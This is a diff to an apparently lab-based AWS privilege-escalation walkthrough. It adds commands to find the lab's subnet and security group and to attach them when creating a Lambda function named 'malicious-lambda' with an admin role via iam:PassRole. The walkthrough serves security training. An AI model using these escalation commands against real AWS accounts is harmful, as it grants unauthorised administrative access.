@@ -82,6 +82,18 @@ cd /tmp && zip lambda_payload.zip lambda_function.py
 
 This is the core privilege escalation action — you use `iam:PassRole` to attach the target role as the Lambda's execution role, and `lambda:CreateFunction` to deploy your code:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-admin-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-admin-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 aws lambda create-function \
   --function-name pl-prod-lambda-002-malicious-lambda \
@@ -90,7 +102,8 @@ aws lambda create-function \
   --handler lambda_function.lambda_handler \
   --zip-file fileb:///tmp/lambda_payload.zip \
   --timeout 30 \
-  --environment "Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}"
+  --environment "Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}" \
+  --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 The Lambda function now exists with admin-level execution permissions — but it hasn't run yet, and you can't directly invoke it.
